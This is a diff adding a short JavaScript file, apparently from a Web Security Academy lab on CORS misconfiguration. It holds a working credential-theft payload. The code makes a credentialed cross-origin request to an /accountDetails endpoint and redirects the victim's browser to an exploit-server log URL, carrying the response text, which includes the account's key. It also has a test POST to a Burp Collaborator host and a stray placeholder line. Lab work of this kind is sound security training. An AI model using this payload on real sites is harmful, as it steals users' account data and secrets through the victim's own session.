@@ -1,0 +1,24 @@
+const collaboratorURL =
+  "http://<burp-collaborator-domain>.burpcollaborator.net";
+
+fetch(collaboratorURL, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({}),
+});
+_____;
+
+const id = "0a73009b0474db0181bc9de3004a004d";
+const exploitId = "exploit-0a5d00ec04c1db7881349c9c01ab005d";
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open("get", `https://${id}.web-security-academy.net/accountDetails`, true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+  location =
+    `https://${exploitId}.exploit-server.net/log?key=` + this.responseText;
+}
